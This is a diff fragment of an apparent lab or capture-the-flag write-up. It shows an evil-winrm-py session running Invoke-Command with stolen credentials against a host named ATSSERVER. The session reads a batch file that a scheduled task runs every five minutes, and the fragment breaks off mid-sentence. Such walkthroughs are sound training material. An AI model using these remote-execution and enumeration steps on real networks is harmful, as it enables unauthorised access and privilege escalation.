@@ -639,7 +639,28 @@ acute\awallace
 And this proves i can execute commands as this user
 
 ```python
+evil-winrm-py PS C:\Temp> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {ls "C:\Program Files\keepmeon"}
+ -Credential $cred -ConfigurationName dc_manage
 
+
+    Directory: C:\Program Files\keepmeon
+
+
+Mode                 LastWriteTime         Length Name                                PSComputerName                    
+----                 -------------         ------ ----                                --------------                    
+-a----        12/21/2021   2:57 PM            128 keepmeon.bat                        ATSSERVER                         
+
+
+evil-winrm-py PS C:\Temp> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {cat "C:\Program Files\keepmeon\
+keepmeon.bat"} -Credential $cred -ConfigurationName dc_manage
+REM This is run every 5 minutes. For Lois use ONLY
+@echo off
+ for /R %%x in (*.bat) do (
+ if not "%%x" == "%~0" call "%%x"
+)
+evil-winrm-py PS C:\Temp>
 ```
+
+There is an interesting script in f
 
 
